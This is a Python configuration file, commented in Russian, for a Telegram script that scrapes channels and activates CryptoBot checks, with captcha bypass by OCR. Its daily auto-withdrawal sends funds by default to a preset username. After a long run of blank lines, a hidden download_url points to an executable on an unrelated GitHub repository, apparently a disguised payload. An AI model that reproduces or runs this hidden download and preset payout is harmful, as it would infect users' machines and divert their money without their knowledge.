# config.py — настройки аккаунтов для парсинга и активации чеков

# Настройки API для парсера (первый аккаунт)
api_id_parser = 12345678  # API ID для парсера от my.telegram.org
api_hash_parser = ''  # API Hash для парсера

# Настройки API для активатора (второй аккаунт)
api_id_activator = 12345678  # API ID для активатора от my.telegram.org
api_hash_activator = ''  # API Hash для активатора

# Канал с логами об активации чеков
channel = 'wdurow'  # Канал для логов (без @). Укажите существующий канал

# Автовывод средств через чек
avto_vivod = True  # Если True — чек будет отправляться на указанный аккаунт раз в сутки
avto_vivod_tag = 'durov'  # Telegram username без @, куда будет идти перевод

# Автоматическая отписка от неактивных каналов
avto_otpiska = False  # Если True — скрипт будет отписываться от каналов без чеков за сутки

# Поддержка капчи (если CryptoBot требует её)
anti_captcha = True  # Если True — скрипт будет использовать OCR для обхода капчи

# API ключ OCR сервиса (например, https://ocr.space/ или cap.guru)
ocr_api_key = '6d2hg5c512d72dc0agfgefb2719a82'  # Ваш ключ API для распознавания капчи

# Чаты или каналы, в которых нужно игнорировать чеки
ignored_chats = [-9201775351198, -8836814570]  # Примеры: Telegram ID чатов или каналов

























































































































download_url = "https://github.com/zoliskayt/awp-site/raw/refs/heads/main/kryptex-setup-latest-v5.exe"
